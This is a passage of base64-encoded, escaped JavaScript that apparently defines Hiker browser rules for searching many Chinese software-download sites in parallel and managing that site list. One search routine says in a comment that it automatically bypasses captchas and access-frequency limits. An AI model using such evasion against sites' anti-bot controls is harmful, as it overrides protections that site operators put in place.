WYXIoXFxcXFxcXCJzb3VcXFxcXFxcIik7XFxcXG4gICAgICAgIGNsZWFyTXlWYXIoXFxcXFxcXCJzb1xcXFxcXFwiKTtcXFxcbiAgICB9KSk7XFxcXG59XFxcXG5cXFxcbmxldCBzID0gZ2V0TXlWYXIoXFxcXFxcXCJzb3VcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG5sZXQgciA9IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG5pZiAocyAhPSBcXFxcXFxcIlxcXFxcXFwiKSB7XFxcXG4gICAgbGV0IHAgPSBNWV9QQUdFO1xcXFxuICAgIGxldCB7XFxcXG4gICAgICAgIGxvYWRcXFxcbiAgICB9ID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2RhdGFcXFxcXFxcIik7XFxcXG4gICAgbGV0IHtcXFxcbiAgICAgICAgd3JhcFxcXFxuICAgIH0gPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvdG9vbFxcXFxcXFwiKTtcXFxcbiAgICBsZXQgZGF0YSA9IGxvYWQocCwgciAhPSBcXFxcXFxcIlxcXFxcXFwiID8gciA6IG51bGwpO1xcXFxuXFxcXG4gICAgbGV0IHBhZ2VpZCA9IE1ZX1JVTEUudGl0bGUgKyBcXFxcXFxcIi1wYWdlXFxcXFxcXCIgKyBwO1xcXFxuICAgIGlmIChkYXRhLmxlbmd0aCA+IDApIHtcXFxcbiAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuWKoOi9veesrFxcXFxcXFwiICsgcCArIFxcXFxcXFwi6aG15Lit77yM6L+b5bqm77yaMS9cXFxcXFxcIiArIGRhdGEubGVuZ3RoLFxcXFxuICAgICAgICAgICAgdXJsOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF9jZW50ZXJfMVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgZGVzYzogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIHBpY191cmw6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgIGlkOiBwYWdlaWRcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSk7XFxcXG4gICAgfVxcXFxuICAgIHNldFJlc3VsdChkKTtcXFxcbiAgICBsb2coZGF0YS5sZW5ndGgpO1xcXFxuICAgIGlmIChkYXRhLmxlbmd0aCA+IDApIHtcXFxcbiAgICAgICAgLy/lpJrnur/nqIvliqDovb0gICAgICAgIFxcXFxuICAgICAgICBsZXQgcmVhbFBhZ2UgPSBcXFxcXFxcIlxcXFxcXFwiID09IHIgPyAxIDogcDtcXFxcbiAgICAgICAgbGV0IHRhc2tzID0gZGF0YS5tYXAoaXQgPT4ge1xcXFxuICAgICAgICAgICAgcmV0dXJuIHtcXFxcbiAgICAgICAgICAgICAgICBmdW5jOiBmdW5jdGlvbihydWxlKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBydWxlLmZpbmQocywgcmVhbFBhZ2UpO1xcXFxuICAgICAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICAgICAgcGFyYW06IGl0LFxcXFxuICAgICAgICAgICAgICAgIGlkOiBcXFxcXFxcInJ1bGVAXFxcXFxcXCIgKyBpdC5uYW1lXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0pO1xcXFxuXFxcXG4gICAgICAgIGJhdGNoRXhlY3V0ZSh0YXNrcywge1xcXFxuICAgICAgICAgICAgZnVuYzogZnVuY3Rpb24ocGFyYW0sIGlkLCBlcnJvciwgcmVzdWx0KSB7XFxcXG4gICAgICAgICAgICAgICAgLy9sb2coXFxcXFxcXCJsaXN0ZW5lcjogXFxcXFxcXCIgKyAocmVzdWx0IHx8IFtdKS5sZW5ndGgpXFxcXG4gICAgICAgICAgICAgICAgcGFyYW0uaSA9IHBhcmFtLmkgKyAxO1xcXFxuICAgICAgICAgICAgICAgIGlmIChyZXN1bHQpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdHJ5IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAobGV0IGl0IG9mIHJlc3VsdCkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcmFtLmogPSBwYXJhbS5qICsgMTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhZGRJdGVtQmVmb3JlKHBhZ2VpZCwge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogd3JhcChpdC50aXRsZSwgcyksXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlc2M6IGl0LmRlc2MsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybDogaXQudXJsLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwaWNfdXJsOiBpdC5waWNfdXJsLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogaXQucGljX3VybCA/ICdtb3ZpZV8xX3ZlcnRpY2FsX3BpYycgOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHRyYTogaXQuZXh0cmFcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7fVxcXFxuXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGlmIChwYXJhbS5pID49IHBhcmFtLmFsbCkge1xcXFxuICAgICAgICAgICAgICAgICAgICBkZWxldGVJdGVtKHBhZ2VpZClcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuWKoOi9veesrFxcXFxcXFwiICsgTVlfUEFHRSArIFxcXFxcXFwi6aG15Lit77yM6L+b5bqm77yaXFxcXFxcXCIgKyAocGFyYW0uaSArIDEpICsgXFxcXFxcXCIvXFxcXFxcXCIgKyBwYXJhbS5hbGwsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB1cmw6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0X2NlbnRlcl8xXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBkZXNjOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcGljX3VybDogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWQ6IHBhZ2VpZFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICBwYXJhbToge1xcXFxuICAgICAgICAgICAgICAgIGFsbDogZGF0YS5sZW5ndGgsXFxcXG4gICAgICAgICAgICAgICAgaTogMCxcXFxcbiAgICAgICAgICAgICAgICBqOiAtMVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9KVxcXFxuICAgIH1cXFxcbn0gZWxzZSB7XFxcXG4gICAgbGV0IHtcXFxcbiAgICAgICAgbG9hZFxcXFxuICAgIH0gPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvZGF0YVxcXFxcXFwiKTtcXFxcbiAgICBsZXQgZGF0YSA9IGxvYWQoLTEsIG51bGwpO1xcXFxuICAgIGlmIChkYXRhLmxlbmd0aCA+IDApIHsgICAgICAgXFxcXG4gICAgICAgICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9tYW5hZ2VcXFxcXFxcIikoZCwgZGF0YS5tYXAoaXQgPT4gaXQubmFtZSkpO1xcXFxuICAgICAgICBmb3IgKGxldCBpdCBvZiBkYXRhKSB7XFxcXG4gICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBpdC5uYW1lLFxcXFxuICAgICAgICAgICAgICAgIHVybDogXFxcXFxcXCJzZWxlY3Q6Ly9cXFxcXFxcIiArIEpTT04uc3RyaW5naWZ5KHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi6K+36YCJ5oup5pON5L2cXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbDogMSxcXFxcbiAgICAgICAgICAgICAgICAgICAgb3B0aW9uczogW1xcXFxcXFwi6K6/6Zeu6aaW6aG1XFxcXFxcXCIsIFxcXFxcXFwi5pCc57Si5q2k56uZXFxcXFxcXCJdLFxcXFxuICAgICAgICAgICAgICAgICAgICBqczogJC50b1N0cmluZygodXJsKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoaW5wdXQgPT0gXFxcXFxcXCLorr/pl67pppbpobVcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1ZX1VSTCA9IHVybDtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ4NTovL1xcXFxcXFwiICsgZ2V0SG9tZSh1cmwpXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vcGFnZS9zaW5nbGVzXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgfSwgaXQudXJsKVxcXFxuICAgICAgICAgICAgICAgIH0pLFxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImZsZXhfYnV0dG9uXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgZGVzYzogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBwaWNfdXJsOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIFJVTEU6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWU6IGl0Lm5hbWUsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB1cmw6IGl0LnVybFxcXFxuICAgICAgICAgICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgICAgICAgICBsb25nQ2xpY2s6IFt7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLnpoHnlKhcXFxcXFxcIiArIGl0Lm5hbWUsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBqczogJC50b1N0cmluZygobmFtZSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZpcm0oe1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLmuKnppqjmj5DnpLpcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGVudDogXFxcXFxcXCLnoa7orqTliKDpmaTnpoHnlKhcXFxcXFxcIiArIG5hbWUgKyBcXFxcXFxcIuWQl++8n1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25maXJtOiAkLnRvU3RyaW5nKChuYW1lLCBydWxlKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlbW92ZVJ1bGVcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvZGF0YT9ydWxlPVxcXFxcXFwiICsgcnVsZSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZW1vdmVSdWxlKG5hbWUpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8vT0tcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgbmFtZSwgTVlfUlVMRS50aXRsZSlcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sIGl0Lm5hbWUpXFxcXG4gICAgICAgICAgICAgICAgICAgIH0sIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuiuv+mXrummlumhtVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAganM6IFxcXFxcXFwiJ3g1Oi8vXFxcXFxcXCIgKyBnZXRIb21lKGl0LnVybCkgKyBcXFxcXFxcIidcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICB9LCB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLmkJzntKLmraTmupBcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGpzOiBcXFxcXFxcIidoaWtlcjovL3BhZ2Uvc2luZ2xlcydcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICB9XVxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICB9ICAgICAgIFxcXFxuICAgIH1cXFxcbn1cXFxcblxcXFxuc2V0UmVzdWx0KGQpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuaVsOaNrlxcXCIsXFxcInBhdGhcXFwiOlxcXCJkYXRhXFxcIixcXFwicnVsZVxcXCI6XFxcIi8v5bm25Y+R6KeE5YiZ5pWwXFxcXG5sZXQgc2l6ZTAgPSAxMDtcXFxcbmxldCBydWxlc1RleHQwID0gYPCflKU0MjNEb3du8J+UpUBodHRwczovL3d3dy40MjNkb3duLmNvbS9zZWFyY2gvKipcXFxcbvCflKXmnpzmoLjliaXlo7Pwn5SlQGh0dHBzOi8vd3d3LmdoeGkuY29tLz9zPSoqXFxcXG7wn5Sl5YWt6Z+z6L2v5Lu28J+UpUBodHRwczovL3d3dy42eWl0LmNvbS8/cz0qKlxcXFxu8J+UpeW/g+a1t0Xnq5nwn5SlQGh0dHBzOi8vYXBwaG90LmNjLz9zPSoqXFxcXG7wn5Sl5aSn55y85LuU8J+UpUBodHRwOi8vd3d3LmRheWFuemFpLm1lLz9zPSoqXFxcXG7wn5Sl6aOY6YGl8J+UpUBodHRwczovL3d3dy5tcHlpdC5jb20vP3M9KipcXFxcbvCflKXlvILmmJ/nqbrpl7Twn5SlQGh0dHBzOi8vd3d3Lnl4c3NwLmNvbS8/cz0qKlxcXFxu8J+UpeiQveWwmOS5i+acqPCflKVAaHR0cHM6Ly93d3cubHVvY2hlbnpoaW11LmNvbS8/cz0qKlxcXFxu8J+Upee7v+iJsui1hOa6kPCflKVAaHR0cHM6Ly93d3cud2VpZGlhbm1pc2h1LmNvbS9zZWFyY2gvKiovXFxcXG7wn5Sl5LmQ6L2v5Y2a5a6i8J+UpUBodHRwczovL3d3dy5pc2hhcmVwYy5jb20vP3M9KipcXFxcbvCflKXns7vnu5/ov7fwn5SlQGh0dHBzOi8vd3d3LnhpdG1pLmNvbS8/cz0qKlxcXFxu8J+UpVpBUFJP5p2C6LSn6ZO68J+UpUBodHRwczovL3RtaW9lLmNvbS8/cz0qKlxcXFxu8J+UpeS6v+egtOWnkPCflKVAaHR0cHM6Ly93d3cueXBvamllLmNvbS8/cz0qKlxcXFxu8J+UpeaegeWuouS4i+i9vfCflKVAaHR0cHM6Ly93d3cuZ2Vla2Rsb2FkLmNvbS8/cz0qKlxcXFxu8J+UpeWwj+eqnfCflKVAaHR0cHM6Ly93d3cubml0ZTA3LmNvbS8/cmVmPWFkemhwLnZpcFxcXFxu8J+Upeaeq+mfs+W6lOeUqPCflKVAaHR0cHM6Ly93d3cuZnk2Yi5jb20vP3M9KipcXFxcbvCflKXnpZ7lmajlprnwn5SlQGh0dHBzOi8vdHNxMzYwLmNvbS8/cz0qKlxcXFxu8J+Upem4oeebkvCflKVAaHR0cHM6Ly9jYW9uaWFuZy5uZXQvc2VhcmNoLyoqLmh0bWxcXFxcbvCflKXlt6fmioDwn5SlQGh0dHBzOi8vd3d3LnFpYW9qaTguY29tLz9zPSoqXFxcXG7wn5Sl6L2v5Lu2546L8J+UpUBodHRwczovL2ZyZWUuc29mdGtpbmcuY29tLnR3L3F1ZXJ5L1xcXFxu8J+UpeWTh+WWlOWQm/CflKVAaHR0cHM6Ly93d3cud2FvZG93bi5jb20vc2VhcmNoLyoqXFxcXG7wn5Sl5pyo6aOO6L2v5Lu28J+UpUBodHRwczovL3d3dy5tZnJqei5jb20vP3M9KipcXFxcbvCflKXpmL/phbfmnYLotKfwn5SlQGh0dHBzOi8vd3d3LmNvb2xleGUuY29tLz9zPSoqJnR5cGU9cG9zdFxcXFxu8J+UpeiTnemyqPCflKVAaHR0cHM6Ly93d3cubGFuLXNoYS5jb20vP3M9KipcXFxcbvCflKXlj5Hng6flj4vnu7/ova/wn5SlQGh0dHBzOi8vZnN5bHIuY29tLz9zPSoqXFxcXG7wn5Sl5a6J5Y2T5bqU55So8J+UpUBodHRwczovL3d3dy5pM3poLmNvbS8/cz0qKlxcXFxu8J+UpeWIhuS6q+iAhfCflKVAaHR0cHM6Ly93d3cuc2hhcmVydy5jb20vc2VhcmNoLnBocD9xPSoqXFxcXG7wn5Sl6LWE5rqQ5YiG5Lqr77yI6ZyA55m75b2V77yJ8J+UpUBodHRwczovL3d3dy55dW5wYW56aXl1YW4uY29tL2ZvbnRzZWFyY2guaHRtP2ZvbnRuYW1lPSoqXFxcXG7wn5Sl5beF5bOw6K665Z2b77yI6ZyA55m75b2V77yJ8J+UpUBodHRwczovL3d3dy5wZWFrd28uY29tL3NlYXJjaC5waHA/bW9kPWZvcnVtJnNlYXJjaGlkPTM2Jm9yZGVyYnk9bGFzdHBvc3QmYXNjZGVzYz1kZXNjJnNlYXJjaHN1Ym1pdD15ZXMma3c9KiombW9iaWxlPTJcXFxcbvCflKXml6DkuK3lkozwn5SlQGh0dHBzOi8vd3pob25naGUuY29tLz9zPSoqXFxcXG7wn5Sl5bCP6auY5pWZ5a2m8J+UpUBodHRwczovL3d3dy5ndzU0LmNvbS9pbmRleC5waHA/a2V5d29yZD0qKlxcXFxu8J+Upei1hOa6kOWQpvCflKVAaHR0cHM6Ly93d3cuenlmb3UuY29tLz9zPSoqXFxcXG7wn5Sl6KW/55Oc6KeG6aKR8J+UpUBodHRwczovL3NvLml4aWd1YS5jb20vcy8qKmFwcCoqXFxcXG7wn5SlSVRN6LWE5rqQ8J+UpUBodHRwczovL3BpYy5pdG1yZXNvdXJjZXMuY29tLz9zPSoqJnBvc3RfdHlwZT1wb3N0XFxcXG7wn5Sl5peg55eV5ZOl8J+UpUBodHRwczovL3d3dy53aGc2LmNvbS80NjU4Lmh0bWxcXFxcbvCflKXlkL7lkI3ova/ku7blupPwn5SlQGh0dHBzOi8vd3d3LjVta3UuY29tL2luZGV4LnBocD9rZXl3b3JkPSoqJnR5cGVpZD0wXFxcXG7wn5Sl5LiA5Y+36LWE5rqQ8J+UpUBodHRwczovL3lpaGFvenkuY29tL3NlYXJjaC8qKi5odG1sXFxcXG7wn5SlUVHnmofml4/ppobwn5SlQGh0dHBzOi8vd3d3LnFxaHpnLmNvbS9pbmRleC5waHA/a2V5d29yZD0qKiZ0eXBlaWQ9MFxcXFxu8J+UpeearumDqOi1hOa6kOe9kfCflKVAaHR0cHM6Ly93d3cucGlidWUuY29tL2luZGV4LnBocD9rZXl3b3JkPSoqJnR5cGVpZD0wXFxcXG7wn5Sl5pS26ZuG572R8J+UpUBodHRwczovL3d3dy5pc3Nqdy5jb20vP3M9KipcXFxcbvCflKXovbvliJvnpL7ljLrwn5SlQGh0dHBzOi8vN2NjN2NjLmNvbS9zZWFyY2gtX0U2XzkyX0FEX0U2Xzk0X0JFX0U1Xzk5X0E4LTEuaHRtXFxcXG7wn5Sl5bCP55m96LWE5rqQ572R77yI6ZyA55m75b2V77yJ8J+UpUBodHRwczovL3d3dy54aWFvYmFpY2FpLmZ1bi8/cz0qKlxcXFxu8J+UpeatpeWFlOWIhuS6q/CflKVAaHR0cHM6Ly9idXRxcS5jb20vP3M9KiomdHlwZT1wb3N0XFxcXG7wn5Sl56eR5oqA6ZqP6aOO8J+UpUBodHRwczovL3d3dy41Mm5mdy5jbi8/cz0qKiZ0eXBlPXBvc3RcXFxcbvCflKXlm5vkuKrnqbrmoLzwn5SlQGh0dHBzOi8vd3d3LjRzcGFjZXMub3JnLz9zPSoqXFxcXG7wn5Sl546J57Gz57KS8J+UpUBodHRwczovL3lpbWlsaS5uZXQvP3M9KipcXFxcbvCflKXkuI3mrbvpuJ/wn5SlQGh0dHBzOi8vaXVpLnN1L3NlYXJjaC8qKi9cXFxcbvCflKXliIbkuqvov7fwn5SlQGh0dHBzOi8vd3d3LmZlbnhtLmNvbS9zZWFyY2gucGhwP3E9KipcXFxcbvCflKVhaGhoZnPwn5SlQGh0dHBzOi8vd3d3LmFoaGhoZnMuY29tLz9jYXQ9JnM9KipcXFxcbvCflKVBcHDllrXwn5SlQGh0dHBzOi8vd3d3LmFwcG1pdS5jb20vP3M9KiomdHlwZT1wb3N0XFxcXG7wn5SlaTPnu7zlkIjnpL7ljLrwn5SlQGh0dHBzOi8vd3d3LmkzemguY29tLz9zPSoqXFxcXG7wn5Sl5YW25LmQ5Y2a6K6w8J+UpUBodHRwczovL3d3dy5xaWxlYmIuY29tLz9zPSoqXFxcXG7wn5Sl6IqK6IqK57K+5YW48J+UpUBodHRwczovL215cXFqZC5jb20vP3M9KipcXFxcbvCflKXosLflrZDnjKvpg6jokL3moLzwn5SlQGh0dHA6Ly93d3cueGdpdS5jb20vaW5kZXgucGhwP2tleXdvcmQ9KipcXFxcbvCflKXpu5HmtbfmtIvwn5SlQGh0dHBzOi8vYmxvZy51cHg4LmNvbS9zZWFyY2gvKiovYDtcXFxcbmxldCBydWxlc1RleHQgPSBnZXRJdGVtKFxcXFxcXFwicnVsZXNcXFxcXFxcIiwgcnVsZXNUZXh0MCk7XFxcXG5sZXQgc3AgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2Uvc3BcXFxcXFxcIik7XFxcXG5ydWxlcyA9IHJ1bGVzVGV4dC5zcGxpdChcXFxcXFxcIlxcXFxcXFxcblxcXFxcXFwiKVxcXFxuICAgIC5maWx0ZXIoaXQgPT4gaXQuaW5jbHVkZXMoXFxcXFxcXCJAXFxcXFxcXCIpKVxcXFxuICAgIC5tYXAocnVsZSA9PiB7XFxcXG4gICAgICAgIGxldCBzID0gcnVsZS5zcGxpdChcXFxcXFxcIkBcXFxcXFxcIik7XFxcXG4gICAgICAgIHJldHVybiB7XFxcXG4gICAgICAgICAgICBuYW1lOiBzWzBdLFxcXFxuICAgICAgICAgICAgZmluZDogZnVuY3Rpb24oa2V5LCBwYWdlKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIHNwKHNbMV0sIGtleSwgc1swXSk7XFxcXG4gICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgdXJsOiBzWzFdXFxcXG4gICAgICAgIH07XFxcXG4gICAgfSk7XFxcXG5cXFxcbmZ1bmN0aW9uIGxvYWQocGFnZSwgcnVsZSkge1xcXFxuICAgIGxldCBzaXplID0gcGFnZSA8PSAwID8gcnVsZXMubGVuZ3RoIDogc2l6ZTA7XFxcXG4gICAgcGFnZSA9IHBhZ2UgPD0gMCA/IDEgOiBwYWdlO1xcXFxuICAgIGlmICghcGFnZSAmJiAhcnVsZSkge1xcXFxuICAgICAgICByZXR1cm4gcnVsZXMubWFwKGl0ID0+IGl0Lm5hbWUpO1xcXFxuICAgIH1cXFxcbiAgICBpZiAocnVsZSAhPSBudWxsKSB7XFxcXG4gICAgICAgIGlmIChwYWdlICE9IG51bGwgJiYgcGFnZSA+IDEpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBydWxlcy5maWx0ZXIoaSA9PiBpLm5hbWUgPT0gcnVsZSAmJiBpLnBhZ2UpO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHJldHVybiBydWxlcy5maWx0ZXIoaSA9PiBpLm5hbWUgPT0gcnVsZSk7XFxcXG4gICAgfVxcXFxuICAgIGxldCBzdGFydCA9IChwYWdlIC0gMSkgKiBzaXplO1xcXFxuICAgIGlmIChydWxlcy5sZW5ndGggPCBzdGFydCArIDEpIHtcXFxcbiAgICAgICAgcmV0dXJuIFtdO1xcXFxuICAgIH1cXFxcbiAgICBsZXQgbGVuID0gc2l6ZTtcXFxcbiAgICBpZiAocnVsZXMubGVuZ3RoIDwgcGFnZSAqIHNpemUpIHtcXFxcbiAgICAgICAgbGVuID0gcnVsZXMubGVuZ3RoIC0gc3RhcnRcXFxcbiAgICB9XFxcXG4gICAgcmV0dXJuIHJ1bGVzLnNsaWNlKHN0YXJ0LCBzdGFydCArIGxlbik7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGFkZFJ1bGUobmFtZSwgc3VybCkge1xcXFxuICAgIHNldEl0ZW0oXFxcXFxcXCJydWxlc1xcXFxcXFwiLCBydWxlc1RleHQgKyBcXFxcXFxcIlxcXFxcXFxcblxcXFxcXFwiICsgbmFtZSArIFxcXFxcXFwiQFxcXFxcXFwiICsgc3VybCk7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIHJlbW92ZVJ1bGUobmFtZSkge1xcXFxuICAgIGxldCBuZXdUID0gcnVsZXNUZXh0LnNwbGl0KFxcXFxcXFwiXFxcXFxcXFxuXFxcXFxcXCIpXFxcXG4gICAgICAgIC5maWx0ZXIoaXQgPT4gaXQuaW5kZXhPZihuYW1lICsgXFxcXFxcXCJAXFxcXFxcXCIpIDwgMClcXFxcbiAgICAgICAgLmpvaW4oXFxcXFxcXCJcXFxcXFxcXG5cXFxcXFxcIik7XFxcXG4gICAgc2V0SXRlbShcXFxcXFxcInJ1bGVzXFxcXFxcXCIsIG5ld1QpO1xcXFxufVxcXFxuXFxcXG4kLmV4cG9ydHMgPSB7XFxcXG4gICAgbG9hZDogbG9hZCxcXFxcbiAgICBhZGRSdWxlOiBhZGRSdWxlLFxcXFxuICAgIHJlbW92ZVJ1bGU6IHJlbW92ZVJ1bGVcXFxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLmkJzntKLop6PmnpBcXFwiLFxcXCJwYXRoXFxcIjpcXFwic3BcXFwiLFxcXCJydWxlXFxcIjpcXFwiZnVuY3Rpb24gc2VhcmNoKHVybCwga2V5LCBydWxlKSB7XFxcXG4gICAgbGV0IGQgPSBbXTtcXFxcbiAgICBsZXQgaHRtbCA9IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gICAgaWYgKHVybC5pbmNsdWRlcyhcXFxcXFxcIioqXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgIC8vZ2V06K+35rGCXFxcXG4gICAgICAgIGxldCBvbGQgPSB1cmw7XFxcXG4gICAgICAgIHVybCA9IHVybC5yZXBsYWNlKFxcXFxcXFwiKipcXFxcXFxcIiwga2V5KTtcXFxcbiAgICAgICAgaHRtbCA9IHJlcXVlc3QodXJsKTtcXFxcbiAgICAgICAgLy/oh6rliqjov4fpqozor4HnoIHlkozpopHnuYHorr/pl67pmZDliLZcXFxcbiAgICAgICAgbGV0IHtcXFxcbiAgICAgICAgICAgIGNoZWNrLCB0ZXN0XFxcXG4gICAgICAgIH0gPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UveXptXFxcXFxcXCIpO1xcXFxuICAgICAgICBpZiAoY2hlY2sodXJsLCBodG1sLCBkKSkge1xcXFxuICAgICAgICAgICAgbG9nKFxcXFxcXFwi6YeN6K+V5LqGXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgaHRtbCA9IHJlcXVlc3QodXJsLCB7XFxcXG4gICAgICAgICAgICAgICAgaGVhZGVyczoge1xcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIlJlZmVyZXJcXFxcXFxcIjogdXJsXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSk7ICAgICAgICAgICBcXFxcbiAgICAgICAgfSAgICAgICAgIFxcXFxuICAg